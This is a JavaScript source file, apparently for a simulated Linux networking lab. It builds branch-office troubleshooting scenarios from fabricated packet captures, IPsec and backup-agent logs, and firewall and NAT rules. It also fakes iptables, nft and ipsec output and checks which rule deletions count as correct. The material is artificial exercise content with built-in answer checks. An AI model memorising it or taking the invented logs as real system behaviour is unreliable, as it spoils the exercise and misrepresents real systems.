      '/var/log/captures/TAC-48544/README.txt': 'Branch IST-BR-07 capture notlari, TAC-48544\ndsl-backup.pcap    core-sw01 SPAN, bkp01 (192.168.1.20) portu linuxlab eth0\'a mirror, DSL-2 uzerinden backup donarken\nbkp-dns.pcap       linuxlab eth0, tcpdump -i eth0 port 53\nalarm-smtp.pcap    linuxlab eth0, tcpdump -i eth0 port 25 or port 587\n',
    },
    rtAdd: '300\tot',
    pcaps: ['TAC-48544/dsl-backup', 'TAC-48544/bkp-dns', 'TAC-48544/alarm-smtp'],
    fw: {
      chain: 'EGRESS-SMTP', ports: [['10.50.0.25', 25]], open: [['10.50.0.25', 587]],
      ipt: (any, num) => [412, 24720, 'DROP', 'tcp', '*', '*', any, any, num ? 'tcp dpt:25' : 'tcp dpt:smtp'],
      save: '-A EGRESS-SMTP -p tcp -m tcp --dport 25 -j DROP',
      nft: 'tcp dport 25 counter packets 412 bytes 24720 drop',
      specOk: s => vopSpecHas(s, '-p|--protocol', 'tcp') && vopSpecHas(s, '--dport|--destination-port', '(25|smtp)') && vopSpecHas(s, '-j|--jump', 'DROP') && (!/(-d|--destination)\s/.test(s) || vopSpecHas(s, '-d|--destination', '0\\.0\\.0\\.0\\/0')) && !/(-s|--source|-i|-o|--sport)\s/.test(s),
    },
    nat: {
      ipt: any => [988, '71K', 'MASQUERADE', 'all', '*', 'eth0', '10.8.0.0/24', any],
      save: '-A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE',
      nft: 'ip saddr 10.8.0.0/24 oif "eth0" masquerade',
    },
    swan: {
      name: 'ot-vendor',
      conns: ['   ot-vendor:  192.168.1.42...203.0.113.40  IKEv2, dpddelay=30s', '   ot-vendor:   local:  [branch-ist07.example.net] uses pre-shared key authentication', '   ot-vendor:   remote: [ike.vendor.example] uses pre-shared key authentication', '   ot-vendor:   child:  192.168.2.0/24 === 10.80.0.0/16 TUNNEL, dpdaction=restart'],
      saHead: 'Security Associations (2 up, 1 connecting):',
      sas: ['   ot-vendor[21]: ESTABLISHED 6 minutes ago, 192.168.1.42[branch-ist07.example.net]...203.0.113.40[ike.vendor.example]', '   ot-vendor[21]: IKEv2 SPIs: 0b7e5d3c1a294f68_i* 6f2e9d1c0b8a7354_r, pre-shared key reauthentication in 3 hours', '   ot-vendor[21]: IKE proposal: AES_GCM_16_256/PRF_HMAC_SHA2_256/ECP_256'],
      upFail: "initiating IKE_SA ot-vendor[22] to 203.0.113.40\ngenerating IKE_SA_INIT request 0 [ SA KE No N(NATD_S_IP) N(NATD_D_IP) N(FRAG_SUP) N(HASH_ALG) N(REDIR_SUP) ]\nsending packet: from 192.168.1.42[500] to 203.0.113.40[500] (464 bytes)\nreceived packet: from 203.0.113.40[500] to 192.168.1.42[500] (248 bytes)\nparsed IKE_SA_INIT response 0 [ SA KE No N(NATD_S_IP) N(NATD_D_IP) N(FRAG_SUP) N(HASH_ALG) ]\nauthentication of 'branch-ist07.example.net' (myself) with pre-shared key\nestablishing CHILD_SA ot-vendor{22}\ngenerating IKE_AUTH request 1 [ IDi N(INIT_CONTACT) IDr AUTH SA TSi TSr N(MOBIKE_SUP) N(NO_ADD_ADDR) N(MULT_AUTH) N(EAP_ONLY) N(MSG_ID_SYN_SUP) ]\nsending packet: from 192.168.1.42[4500] to 203.0.113.40[4500] (368 bytes)\nreceived packet: from 203.0.113.40[4500] to 192.168.1.42[4500] (112 bytes)\nparsed IKE_AUTH response 1 [ IDr AUTH N(TS_UNACCEPT) ]\nauthentication of 'ike.vendor.example' with pre-shared key successful\nIKE_SA ot-vendor[22] established between 192.168.1.42[branch-ist07.example.net]...203.0.113.40[ike.vendor.example]\nreceived TS_UNACCEPTABLE notify, no CHILD_SA built\nfailed to establish CHILD_SA, keeping IKE_SA\nestablishing connection 'ot-vendor' failed",
      swl: ['ot-vendor: #21, ESTABLISHED, IKEv2, 0b7e5d3c1a294f68_i* 6f2e9d1c0b8a7354_r', "  local  'branch-ist07.example.net' @ 192.168.1.42[4500]", "  remote 'ike.vendor.example' @ 203.0.113.40[4500]", '  AES_GCM_16-256/PRF_HMAC_SHA2_256/ECP_256', '  established 360s ago, reauth in 10440s'],
      swL: ['ot-vendor: IKEv2, no reauthentication, rekeying every 14400s', '  local:  192.168.1.42', '  remote: 203.0.113.40', '  local pre-shared key authentication:', '    id: branch-ist07.example.net', '  remote pre-shared key authentication:', '    id: ike.vendor.example', '  ot-vendor: TUNNEL, rekeying every 3600s', '    local:  192.168.2.0/24', '    remote: 10.80.0.0/16'],
    },
    units: {
      strongswan: NET_SWAN_LOG + join([
        'Oct 21 05:59:58 linuxlab charon[1210]: 00[CFG] loaded IKE secret for %any 203.0.113.40',
        "Oct 21 05:59:58 linuxlab charon[1210]: 00[CFG] added configuration 'ot-vendor'",
        'Oct 21 06:00:04 linuxlab charon[1210]: 07[IKE] initiating IKE_SA ot-vendor[2] to 203.0.113.40',
        'Oct 21 06:00:04 linuxlab charon[1210]: 08[CFG] selected proposal: IKE:AES_GCM_16_256/PRF_HMAC_SHA2_256/ECP_256',
        'Oct 21 06:00:04 linuxlab charon[1210]: 08[ENC] generating IKE_AUTH request 1 [ IDi N(INIT_CONTACT) IDr AUTH SA TSi TSr ]',
        'Oct 21 06:00:04 linuxlab charon[1210]: 09[ENC] parsed IKE_AUTH response 1 [ IDr AUTH N(TS_UNACCEPT) ]',
        'Oct 21 06:00:04 linuxlab charon[1210]: 09[IKE] IKE_SA ot-vendor[2] established between 192.168.1.42[branch-ist07.example.net]...203.0.113.40[ike.vendor.example]',
        'Oct 21 06:00:04 linuxlab charon[1210]: 09[IKE] received TS_UNACCEPTABLE notify, no CHILD_SA built',
        'Oct 21 06:00:04 linuxlab charon[1210]: 09[IKE] failed to establish CHILD_SA, keeping IKE_SA',
        'Oct 21 06:00:04 linuxlab charon[1210]: 09[CFG] proposed traffic selectors: 192.168.2.0/24 === 10.80.0.0/16, see /opt/ot-vendor/onboarding.txt',
      ]),
      'bkp-agent': join([
        'Oct 21 01:00:00 linuxlab bkp-agent[1533]: INFO  nightly job ist-br07-full started',
        'Oct 21 01:00:00 linuxlab bkp-agent[1533]: INFO  network.nameserver set in agent.ini, using 192.168.1.99',
        'Oct 21 01:00:03 linuxlab bkp-agent[1533]: WARN  resolve files.corp.lab via 192.168.1.99 timed out, attempt 1/3',
        'Oct 21 01:00:06 linuxlab bkp-agent[1533]: WARN  resolve files.corp.lab via 192.168.1.99 timed out, attempt 2/3',
        'Oct 21 01:00:09 linuxlab bkp-agent[1533]: WARN  resolve files.corp.lab via 192.168.1.99 timed out, attempt 3/3',
        'Oct 21 01:00:09 linuxlab bkp-agent[1533]: ERROR job ist-br07-full failed: could not resolve repository host files.corp.lab',
        'Oct 21 01:00:09 linuxlab bkp-agent[1533]: ERROR alarm mail to noc@corp.lab via mail.corp.lab:25 failed: connection timed out',
      ]),
    },
    neigh: ns => ns.concat([{ ip: '192.168.1.99', dev: 'eth0', mac: null, st: 'FAILED' }]),
    dead: [],
    eth: { eth1: { speed: '10Mb/s', st: { collisions: 5310, tx_late_collisions: 2471 } } },
    ifs: { eth1: { tx: [288110334, 744102, 0, 0, 0, 5310] } },
    tables: { 300: 'ot', ot: 'ot' },
    routes: { ot: [
      { d: '0.0.0.0', l: 0, via: '192.168.2.254', dev: 'eth1', src: '192.168.2.1', t: 'default via 192.168.2.254 dev eth1' },
      { d: '192.168.2.0', l: 24, dev: 'eth1', src: '192.168.2.1', t: '192.168.2.0/24 dev eth1 scope link src 192.168.2.1' },
    ] },
    rules: ['0:\tfrom all lookup local', '100:\tfrom 192.168.100.5 lookup dsl', '300:\tfrom 192.168.2.0/24 iif eth1 lookup ot', '32766:\tfrom all lookup main', '32767:\tfrom all lookup default'],
    ct: ['tcp', 6, 118, 'SYN_SENT', '192.168.1.42', '10.50.0.25', 51744, 25, '10.50.0.25', '192.168.1.42', 25, 51744, '[UNREPLIED]'],
    dmesg: t => t.replace('eth1 NIC Link is Up 100 Mbps Half Duplex', 'eth1 NIC Link is Up 10 Mbps Half Duplex') + '[ 5812.004411] nf_conntrack: nf_conntrack: table full, dropping packet\n[ 5812.118203] nf_conntrack: nf_conntrack: table full, dropping packet\n',
  },
};

/* Capture dosyalari. Yeni path'ler, temel dunyada bu dosyalar hic olusmadigi icin tcpdump onlari sadece varyantta okur */
Object.assign(NET_CAPS, {
  '/var/log/captures/TAC-48377/partner-sftp.pcap': { link: 'EN10MB (Ethernet)', pk: [
    netPkt('14:02:10.100100', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [S], seq 3011220001, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
    netPkt('14:02:10.161300', 'tcp', '172.31.10.20', 22, '192.168.2.50', 50110, 'Flags [S.], seq 822001200, ack 3011220002, win 65160, options [mss 1460,sackOK,TS val 9901 ecr 0,nop,wscale 7], length 0'),
    netPkt('14:02:10.161420', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [.], ack 1, win 1026, length 0'),
    netPkt('14:02:10.162001', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [P.], seq 1:42, ack 1, win 1026, length 41: SSH: SSH-2.0-OpenSSH_for_Windows_8.1'),
    netPkt('14:02:10.223310', 'tcp', '172.31.10.20', 22, '192.168.2.50', 50110, 'Flags [P.], seq 1:33, ack 42, win 509, length 32: SSH: SSH-2.0-OpenSSH_9.6'),
    netPkt('14:02:10.902114', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [P.], seq 1450:1922, ack 1401, win 1026, length 472'),
    netPkt('14:02:11.001902', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [.], seq 1922:3370, ack 1401, win 1026, length 1448'),
    netPkt('14:02:11.001977', 'icmp', '192.168.2.1', 0, '192.168.2.50', 0, '172.31.10.20 unreachable - need to frag (mtu 1380), length 556'),
    netPkt('14:02:11.002030', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [.], seq 3370:4818, ack 1401, win 1026, length 1448'),
    netPkt('14:02:11.002061', 'icmp', '192.168.2.1', 0, '192.168.2.50', 0, '172.31.10.20 unreachable - need to frag (mtu 1380), length 556'),
    netPkt('14:02:11.304411', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [.], seq 1922:3370, ack 1401, win 1026, length 1448'),
    netPkt('14:02:11.304470', 'icmp', '192.168.2.1', 0, '192.168.2.50', 0, '172.31.10.20 unreachable - need to frag (mtu 1380), length 556'),
    netPkt('14:02:11.906120', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [.], seq 1922:3370, ack 1401, win 1026, length 1448'),
    netPkt('14:02:13.110009', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [.], seq 1922:3370, ack 1401, win 1026, length 1448'),
    netPkt('14:02:15.512330', 'tcp', '192.168.2.50', 50110, '172.31.10.20', 22, 'Flags [.], seq 1922:3370, ack 1401, win 1026, length 1448'),
  ] },
  '/var/log/captures/TAC-48377/historian-dns.pcap': { link: 'EN10MB (Ethernet)', pk: [
    netPkt('07:30:01.900120', 'udp', '192.168.1.42', 40110, '192.168.1.1', 53, '3301+ A? portal.corp.lab. (33)'),
    netPkt('07:30:01.902340', 'udp', '192.168.1.1', 53, '192.168.1.42', 40110, '3301 1/0/0 A 10.50.0.30 (49)'),
    netPkt('07:30:02.004411', 'udp', '192.168.1.42', 51877, '198.51.100.53', 53, '7710+ A? files.corp.lab. (32)'),
    netPkt('07:30:05.006012', 'udp', '192.168.1.42', 51877, '198.51.100.53', 53, '7710+ A? files.corp.lab. (32)'),
    netPkt('07:30:06.311240', 'udp', '192.168.1.10', 50211, '192.168.1.1', 53, '1902+ A? files.corp.lab. (32)'),
    netPkt('07:30:06.313380', 'udp', '192.168.1.1', 53, '192.168.1.10', 50211, '1902 1/0/0 A 10.50.0.20 (48)'),
    netPkt('07:30:08.007733', 'udp', '192.168.1.42', 51877, '198.51.100.53', 53, '7710+ A? files.corp.lab. (32)'),
    netPkt('07:30:12.440019', 'udp', '192.168.1.42', 37120, '192.168.1.1', 53, '8812+ A? ntp.ubuntu.com. (32)'),
    netPkt('07:30:12.461002', 'udp', '192.168.1.1', 53, '192.168.1.42', 37120, '8812 2/0/0 A 185.125.190.56, A 185.125.190.57 (64)'),
  ] },
  '/var/log/captures/TAC-48377/historian-syn.pcap': { link: 'EN10MB (Ethernet)', pk: [
    netPkt('08:11:20.004100', 'arp', '192.168.2.50', 0, '192.168.2.1', 0, 'Request who-has 192.168.2.1 tell 192.168.2.50, length 46'),
    netPkt('08:11:20.004190', 'arp', '192.168.2.1', 0, '192.168.2.50', 0, 'Reply 192.168.2.1 is-at 52:54:00:12:34:57, length 28'),
    netPkt('08:11:20.005002', 'tcp', '192.168.2.50', 49702, '10.50.0.20', 445, 'Flags [S], seq 2201193301, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
    netPkt('08:11:20.006110', 'tcp', '192.168.2.50', 49703, '10.50.0.20', 139, 'Flags [S], seq 812201933, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
    netPkt('08:11:20.050620', 'tcp', '10.50.0.20', 139, '192.168.2.50', 49703, 'Flags [R.], seq 0, ack 812201934, win 0, length 0'),
    netPkt('08:11:21.006302', 'tcp', '192.168.2.50', 49702, '10.50.0.20', 445, 'Flags [S], seq 2201193301, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
    netPkt('08:11:22.401230', 'icmp', '192.168.2.51', 0, '192.168.2.1', 0, 'echo request, id 1301, seq 4, length 64'),
    netPkt('08:11:22.401301', 'icmp', '192.168.2.1', 0, '192.168.2.51', 0, 'echo reply, id 1301, seq 4, length 64'),
    netPkt('08:11:23.008811', 'tcp', '192.168.2.50', 49702, '10.50.0.20', 445, 'Flags [S], seq 2201193301, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
    netPkt('08:11:24.120330', 'tcp', '192.168.2.50', 49188, '10.50.0.30', 443, 'Flags [P.], seq 9921:10002, ack 30011, win 501, length 81'),
    netPkt('08:11:27.012004', 'tcp', '192.168.2.50', 49702, '10.50.0.20', 445, 'Flags [S], seq 2201193301, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
    netPkt('08:11:35.020119', 'tcp', '192.168.2.50', 49702, '10.50.0.20', 445, 'Flags [S], seq 2201193301, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
  ] },
  '/var/log/captures/TAC-48544/dsl-backup.pcap': { link: 'EN10MB (Ethernet)', pk: [
    netPkt('23:52:01.100210', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [S], seq 4100230011, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0'),
    netPkt('23:52:01.162330', 'tcp', '10.50.0.20', 445, '192.168.1.20', 61010, 'Flags [S.], seq 1200331102, ack 4100230012, win 65160, options [mss 1460,sackOK,TS val 4411 ecr 0,nop,wscale 7], length 0'),
    netPkt('23:52:01.162401', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [.], ack 1, win 1026, length 0'),
    netPkt('23:52:01.163002', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [P.], seq 1:195, ack 1, win 1026, length 194: SMB2 NEGOTIATE'),
    netPkt('23:52:01.225118', 'tcp', '10.50.0.20', 445, '192.168.1.20', 61010, 'Flags [P.], seq 1:251, ack 195, win 509, length 250: SMB2 NEGOTIATE response'),
    netPkt('23:52:02.400331', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [.], seq 9011:10459, ack 1802, win 1026, length 1448: SMB2 WRITE'),
    netPkt('23:52:02.400402', 'icmp', '192.168.1.1', 0, '192.168.1.20', 0, '10.50.0.20 unreachable - need to frag (mtu 1352), length 556'),
    netPkt('23:52:02.400519', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [.], seq 10459:11907, ack 1802, win 1026, length 1448: SMB2 WRITE'),
    netPkt('23:52:02.400570', 'icmp', '192.168.1.1', 0, '192.168.1.20', 0, '10.50.0.20 unreachable - need to frag (mtu 1352), length 556'),
    netPkt('23:52:02.702100', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [.], seq 9011:10459, ack 1802, win 1026, length 1448: SMB2 WRITE'),
    netPkt('23:52:03.304990', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [.], seq 9011:10459, ack 1802, win 1026, length 1448: SMB2 WRITE'),
    netPkt('23:52:04.508211', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [.], seq 9011:10459, ack 1802, win 1026, length 1448: SMB2 WRITE'),
    netPkt('23:52:06.910004', 'tcp', '192.168.1.20', 61010, '10.50.0.20', 445, 'Flags [.], seq 9011:10459, ack 1802, win 1026, length 1448: SMB2 WRITE'),
  ] },
  '/var/log/captures/TAC-48544/bkp-dns.pcap': { link: 'EN10MB (Ethernet)', pk: [
    netPkt('00:59:58.200110', 'udp', '192.168.1.42', 45120, '192.168.1.1', 53, '1201+ A? mail.corp.lab. (31)'),
    netPkt('00:59:58.202300', 'udp', '192.168.1.1', 53, '192.168.1.42', 45120, '1201 1/0/0 A 10.50.0.25 (47)'),
    netPkt('01:00:00.010200', 'udp', '192.168.1.42', 60233, '192.168.1.99', 53, '4407+ A? files.corp.lab. (32)'),
    netPkt('01:00:03.012110', 'udp', '192.168.1.42', 60233, '192.168.1.99', 53, '4407+ A? files.corp.lab. (32)'),
    netPkt('01:00:06.014001', 'udp', '192.168.1.42', 60233, '192.168.1.99', 53, '4407+ A? files.corp.lab. (32)'),
    netPkt('01:00:07.330019', 'udp', '192.168.1.10', 51900, '192.168.1.1', 53, '2290+ A? files.corp.lab. (32)'),
    netPkt('01:00:07.332201', 'udp', '192.168.1.1', 53, '192.168.1.10', 51900, '2290 1/0/0 A 10.50.0.20 (48)'),
    netPkt('01:00:09.120330', 'udp', '192.168.1.42', 39001, '192.168.1.1', 53, '5120+ AAAA? files.corp.lab. (32)'),
    netPkt('01:00:09.122480', 'udp', '192.168.1.1', 53, '192.168.1.42', 39001, '5120 0/1/0 (87)'),
  ] },
  '/var/log/captures/TAC-48544/alarm-smtp.pcap': { link: 'EN10MB (Ethernet)', pk: [
    netPkt('01:00:09.200100', 'udp', '192.168.1.42', 48211, '192.168.1.1', 53, '6610+ A? mail.corp.lab. (31)'),
    netPkt('01:00:09.202230', 'udp', '192.168.1.1', 53, '192.168.1.42', 48211, '6610 1/0/0 A 10.50.0.25 (47)'),
    netPkt('01:00:09.203110', 'tcp', '192.168.1.42', 51744, '10.50.0.25', 25, 'Flags [S], seq 3300120044, win 64240, options [mss 1460,sackOK,TS val 99120 ecr 0,nop,wscale 7], length 0'),
    netPkt('01:00:10.230020', 'tcp', '192.168.1.42', 51744, '10.50.0.25', 25, 'Flags [S], seq 3300120044, win 64240, options [mss 1460,sackOK,TS val 100147 ecr 0,nop,wscale 7], length 0'),
    netPkt('01:00:12.246113', 'tcp', '192.168.1.42', 51744, '10.50.0.25', 25, 'Flags [S], seq 3300120044, win 64240, options [mss 1460,sackOK,TS val 102163 ecr 0,nop,wscale 7], length 0'),
    netPkt('01:00:12.900330', 'tcp', '192.168.1.42', 51760, '10.50.0.25', 587, 'Flags [S], seq 1022930011, win 64240, options [mss 1460,sackOK,TS val 102817 ecr 0,nop,wscale 7], length 0'),
    netPkt('01:00:12.944871', 'tcp', '10.50.0.25', 587, '192.168.1.42', 51760, 'Flags [S.], seq 5501220330, ack 1022930012, win 65160, options [mss 1360,sackOK,TS val 7712 ecr 102817,nop,wscale 7], length 0'),
    netPkt('01:00:12.944950', 'tcp', '192.168.1.42', 51760, '10.50.0.25', 587, 'Flags [.], ack 1, win 502, length 0'),
    netPkt('01:05:09.210004', 'tcp', '192.168.1.42', 51790, '10.50.0.25', 25, 'Flags [S], seq 1188203301, win 64240, options [mss 1460,sackOK,TS val 396127 ecr 0,nop,wscale 7], length 0'),
    netPkt('01:05:10.240330', 'tcp', '192.168.1.42', 51790, '10.50.0.25', 25, 'Flags [S], seq 1188203301, win 64240, options [mss 1460,sackOK,TS val 397157 ecr 0,nop,wscale 7], length 0'),
    netPkt('01:05:12.256019', 'tcp', '192.168.1.42', 51790, '10.50.0.25', 25, 'Flags [S], seq 1188203301, win 64240, options [mss 1460,sackOK,TS val 399173 ecr 0,nop,wscale 7], length 0'),
  ] },
});
const vopSynCount = (path, port) => NET_CAPS[path].pk.filter(p => p.proto === 'tcp' && p.dport === port && /Flags \[S\]/.test(p.rest)).length;

/* ---------- dunya durumu ---------- */

function vopWorld(sh) {
  const n = sh && typeof sh.node === 'function' ? sh.node(VOP_WORLD_FILE) : null;
  if (!n || n.t !== 'f') return null;
  try { const st = JSON.parse(n.d); return VOP_NETW[st.id] ? { def: VOP_NETW[st.id], st } : null; } catch (e) { return null; }
}
function vopWorldSave(sh, st) {
  const n = sh.node(VOP_WORLD_FILE);
  if (n && n.t === 'f') n.d = JSON.stringify(st); else vopPut(sh, VOP_WORLD_FILE, JSON.stringify(st), 0o600, 'root');
}
/* Dunyayi kurar. Ayni dunya zaten varsa ogrencinin yaptigi degisikliklere dokunmaz, patch ile sadece istenen alanlar ezilir */
function vopNetEnsure(sh, id, patch) {
  const w = vopWorld(sh);
  let st = w && w.st.id === id ? w.st : null;
  if (!st) {
    const def = VOP_NETW[id];
    st = { id, fw: 1 };
    netSetState(sh, { hubblock: false });
    Object.keys(def.files).forEach(p => vopPut(sh, p, def.files[p], p.endsWith('.secrets') || p.includes('/lab-net/') ? 0o600 : 0o644, p.startsWith(VOP_H + '/') ? 'burak' : 'root'));
    def.pcaps.forEach(name => vopPut(sh, '/var/log/captures/' + name + '.pcap', 'ÔÃ²¡ pcap capture ' + name.split('/').pop() + ' (binary, tcpdump -r ile oku)\n', 0o644, 'root'));
    const rt = sh.node('/etc/iproute2/rt_tables');
    if (rt && rt.t === 'f' && !rt.d.split('\n').includes(def.rtAdd)) rt.d = rt.d.replace(/\n?$/, '\n') + def.rtAdd + '\n';
    else if (!rt) vopPut(sh, '/etc/iproute2/rt_tables', '255\tlocal\n254\tmain\n253\tdefault\n0\tunspec\n100\tdsl\n' + def.rtAdd + '\n');
  }
  Object.assign(st, patch || {});
  vopWorldSave(sh, st);
  return st;
}
function vopFwOff(sh, w) { w.st.fw = 0; vopWorldSave(sh, w.st); return ok(''); }

/* Cagri suresince ext-net tablolarini dunyaya gore yamalar, donen fonksiyon hepsini geri alir */
function vopPatch(w) {
  const undo = [];
  const def = w.def;
  const arr = (a, vals) => { const old = a.slice(); a.splice(0, a.length, ...vals); undo.push(() => a.splice(0, a.length, ...old)); };
  const key = (o, k, v) => { const had = Object.prototype.hasOwnProperty.call(o, k); const old = o[k]; o[k] = v; undo.push(() => { if (had) o[k] = old; else delete o[k]; }); };
  if (def.neigh) arr(NET_NEIGH, def.neigh(NET_NEIGH.slice()));
  if (def.noarp && def.noarp.length) arr(NET_NOARP, NET_NOARP.concat(def.noarp));
  if (def.dead && def.dead.length) arr(NET_DEAD, NET_DEAD.concat(def.dead));
  if (def.eth) Object.keys(def.eth).forEach(d => key(NET_ETH, d, Object.assign({}, NET_ETH[d], def.eth[d], { st: Object.assign({}, NET_ETH[d].st, def.eth[d].st || {}) })));
  if (def.ifs) NET_IFACES.forEach((x, i) => { if (def.ifs[x.n]) key(NET_IFACES, i, Object.assign({}, x, def.ifs[x.n])); });
  if (def.tables) Object.keys(def.tables).forEach(k => key(NET_TABLES, k, def.tables[k]));
  if (def.routes) Object.keys(def.routes).forEach(k => key(NET_ROUTES, k, def.routes[k]));
  if (def.rules) arr(NET_RULES, def.rules);
  if (def.fw && def.fw.open) def.fw.open.forEach(([ip, port]) => { if (!NET_PORTS[ip]) key(NET_PORTS, ip, {}); key(NET_PORTS[ip], port, 'open'); });
  if (def.fw && w.st.fw) def.fw.ports.forEach(([ip, port]) => { if (!NET_PORTS[ip]) key(NET_PORTS, ip, {}); key(NET_PORTS[ip], port, 'timeout'); });
  return () => { while (undo.length) undo.pop()(); };
}

/* ---------- dunyaya ozel ciktilar ---------- */

const VOP_CUSTOM = {
  iptables(w, args, stdin, orig) {
    if (!this.isRoot) return orig.call(this, args, stdin);
    const F = w.def.fw; const on = !!w.st.fw;
    const ti = args.indexOf('-t'); const table = ti >= 0 ? args[ti + 1] : 'filter';
    const a = ti < 0 ? args.slice() : args.filter((x, k) => !(k === ti || k === ti + 1));
    const verbose = a.includes('-v'); const num = a.includes('-n');
    const any = num ? '0.0.0.0/0' : 'anywhere';
    const ref = flag => { const i = a.indexOf(flag); return i >= 0 && a[i + 1] && !a[i + 1].startsWith('-') ? a[i + 1] : null; };
    if (table === 'filter') {
      if (['-L', '-D', '-F', '-S'].some(fl => ref(fl) === 'HUB-BLOCK')) return fail('iptables: No chain/target/match by that name.');
      if (a.includes('-D')) {
        const di = a.indexOf('-D'); const chain = a[di + 1]; const spec = a.slice(di + 2);
        if (chain !== F.chain) {
          if (['INPUT', 'FORWARD', 'OUTPUT'].includes(chain)) return fail(`iptables: Bad rule (does a matching rule exist in that chain?).\n💡 DROP rule'u ${F.chain} chain'inde, OUTPUT ve FORWARD sadece oraya jump ediyor`);
          return orig.call(this, args, stdin);
        }
        const numeric = spec.length === 1 && /^\d+$/.test(spec[0]);
        if (!on) return fail(numeric ? 'iptables: Index of deletion too big.' : 'iptables: Bad rule (does a matching rule exist in that chain?).');
        if (numeric) return spec[0] === '1' ? vopFwOff(this, w) : fail('iptables: Index of deletion too big.');
        return F.specOk(spec.join(' ')) ? vopFwOff(this, w) : fail('iptables: Bad rule (does a matching rule exist in that chain?).');
      }
      if (a.includes('-F')) { const c = ref('-F'); if (!c || c === F.chain) vopFwOff(this, w); return ok(''); }
      if (a.includes('-X')) return on ? fail('iptables: Directory not empty.') : fail('iptables: Too many links.');
      if (a.includes('-L') || a.includes('-S')) {
        const r = orig.call(this, args.map(x => (x === F.chain ? 'HUB-BLOCK' : x)), stdin);
        if (r.code) return r;
        const ls = lines(r.out).map(l => l.replace(/HUB-BLOCK/g, F.chain));
        if (on) {
          if (a.includes('-S')) ls.push(F.save);
          else { const i = ls.findIndex(l => l.startsWith('Chain ' + F.chain + ' ')); if (i >= 0) ls.splice(i + 2, 0, vopIptRow(verbose, ...F.ipt(any, num))); }
        }
        return ok(join(ls));
      }
      return orig.call(this, args, stdin);
    }
    if (table === 'nat' && w.def.nat && (a.includes('-L') || a.includes('-S'))) {
      const r = orig.call(this, args, stdin);
      if (r.code) return r;
      const ls = lines(r.out);
      if (a.includes('-S')) ls.push(w.def.nat.save);
      else { const i = ls.findIndex(l => /MASQUERADE/.test(l)); if (i >= 0) ls.splice(i + 1, 0, vopIptRow(verbose, ...w.def.nat.ipt(any))); }
      return ok(join(ls));
    }
    return orig.call(this, args, stdin);
  },
  nft(w, args, stdin, orig) {
    if (!this.isRoot) return orig.call(this, args, stdin);
    const F = w.def.fw; const on = !!w.st.fw;
    const handles = args.includes('-a') || args.includes('--handle');
    const a = args.filter(x => x !== '-a' && x !== '--handle');
    const s = a.join(' ');
    if (a[0] === 'list') {
      const r = orig.call(this, args, stdin);
      if (r.code) return r;
      const ls = lines(r.out).map(l => l.replace(/HUB-BLOCK/g, F.chain));
      if (on) { const i = ls.indexOf('\tchain ' + F.chain + ' {'); if (i >= 0) ls.splice(i + 1, 0, '\t\t' + F.nft + (handles ? ' # handle 7' : '')); }
      if (w.def.nat) { const i = ls.findIndex(l => /masquerade/.test(l)); if (i >= 0) ls.splice(i + 1, 0, '\t\t' + w.def.nat.nft + (handles ? ' # handle 13' : '')); }
      return ok(join(ls));
    }
    if (a[0] === 'delete' && a[1] === 'rule') {
      const m = /^ip filter (\S+) handle (\d+)$/.exec(a.slice(2).join(' '));
      if (!m || m[1] !== F.chain) return fail(`Error: Could not process rule: No such file or directory\n💡 Sözdizimi nft delete rule ip filter ${F.chain} handle N, handle numarası için nft -a list ruleset`);
      if (m[2] !== '7' || !on) return fail('Error: Could not process rule: No such file or directory');
      return vopFwOff(this, w);
    }
    if (a[0] === 'flush' && a[1] === 'chain') {
      if (s === 'flush chain ip filter ' + F.chain) return vopFwOff(this, w);
      if (/HUB-BLOCK/.test(s)) return fail('Error: No such file or directory');
    }
    return orig.call(this, args, stdin);
  },
  ipsec(w, args, stdin, orig) {
    const S = w.def.swan; const sub = args[0];
    if (!S || !sub || this.services.strongswan !== 'active' || !this.isRoot) return orig.call(this, args, stdin);
    if (sub === 'status' || sub === 'statusall') {
      const r = orig.call(this, args, stdin);
      if (r.code) return r;
      const ls = lines(r.out);
      if (sub === 'statusall') { const i = ls.findIndex(l => /cloud-lab:\s+child:/.test(l)); if (i >= 0) ls.splice(i + 1, 0, ...S.conns); }
      const j = ls.findIndex(l => l.startsWith('Security Associations'));
      if (j >= 0) { ls[j] = S.saHead; ls.splice(j + 1, 0, ...S.sas); }
      return ok(join(ls));
    }
    if (sub === 'up' && args[1] === S.name) return fail(S.upFail);
    if (sub === 'down' && args[1] === S.name) return ok('');
    return orig.call(this, args, stdin);
  },
  swanctl(w, args, stdin, orig) {
    const S = w.def.swan;
    const r = orig.call(this, args, stdin);
    if (!S || r.code) return r;
    const add = args.includes('-l') || args.includes('--list-sas') ? S.swl : S.swL;
    return ok(join(lines(r.out).concat(add)));
  },
  journalctl(w, args, stdin, orig) {
    const ui = args.indexOf('-u'); const unit = ui >= 0 ? svcName(args[ui + 1]) : null;
